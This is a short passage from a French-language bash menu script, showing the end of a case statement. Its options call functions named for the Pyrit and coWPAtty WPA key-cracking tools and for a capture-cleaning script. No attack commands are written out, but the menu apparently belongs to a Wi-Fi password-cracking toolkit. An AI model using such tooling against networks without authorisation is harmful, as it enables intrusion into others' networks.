lim_pyrit_attackdb
;;

15)

lim_pyrit_cowpatty
;;

16)

xterm -T "CapCleaner" -e "CapCleaner.sh" ;;

17)
	
lim_fin

exit
break ;;

*) 

echo -e "\033[1mChoix impossible, veuillez ressayer...\033[0m"
esac

done











